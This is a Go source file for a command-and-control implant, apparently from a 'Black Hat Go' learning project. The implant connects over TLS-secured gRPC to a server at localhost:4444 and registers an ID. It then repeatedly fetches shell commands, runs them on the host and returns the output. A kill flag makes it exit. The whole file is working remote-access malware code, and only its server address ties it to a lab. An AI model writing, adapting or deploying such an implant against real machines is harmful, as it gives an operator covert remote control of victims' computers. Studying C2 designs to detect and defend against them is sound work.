package main

import (
	"blackhatgo/c2c/grpcapi"
	"context"
	"fmt"
	"log"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/google/uuid"
	"google.golang.org/grpc"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/credentials"
	"google.golang.org/grpc/metadata"
	"google.golang.org/grpc/status"
)

func main() {
	var (
		opts      []grpc.DialOption
		conn      *grpc.ClientConn
		err       error
		client    grpcapi.ImplantClient
		implantId uuid.UUID
	)

	creds, err := credentials.NewClientTLSFromFile("server.crt", "")
	if err != nil {
		log.Fatalln(err)
	}
	opts = append(opts, grpc.WithTransportCredentials(creds))
	// opts = append(opts, grpc.WithTransportCredentials(insecure.NewCredentials()))
	if conn, err = grpc.NewClient(fmt.Sprintf("localhost:%d", 4444), opts...); err != nil {
		log.Fatal(err)
	}
	defer conn.Close()
	client = grpcapi.NewImplantClient(conn)

	ctx := context.Background()
	var req = new(grpcapi.Empty)
	resp, err := client.RegisterNewImplant(ctx, req)
	if err != nil {
		log.Fatalln(err)
	}
	implantId = uuid.MustParse(resp.Id)
	fmt.Println(implantId)
	for {
		// Inserting grpc metadata in context
		md := metadata.Pairs("implant-id", implantId.String())
		ctx = metadata.NewOutgoingContext(ctx, md)

		var req = new(grpcapi.Empty)
		cmd, err := client.FetchCommand(ctx, req)
		if err != nil {
			st, ok := status.FromError(err)
			if ok {
				switch st.Code() {
				case codes.Unavailable:
					log.Println("Server unavailable. Retrying after 5 seconds...")
				}
			} else {
				// This is a non-gRPC error (very rare here)
				log.Printf("Standard Error: %v", err)
			}
			time.Sleep(5 * time.Second)
			continue
		}

		if cmd.IsKill {
			os.Exit(0)
		}

		if cmd.In == "" {
			// No work
			time.Sleep(3 * time.Second)
			continue
		}

		tokens := strings.Split(cmd.In, " ")
		var c *exec.Cmd
		if len(tokens) == 1 {
			c = exec.Command(tokens[0])
		} else {
			c = exec.Command(tokens[0], tokens[1:]...)
		}
		buf, err := c.CombinedOutput()
		if err != nil {
			cmd.Out = err.Error()
		}
		cmd.Out += string(buf)
		client.SendOutput(ctx, cmd)
	}
}
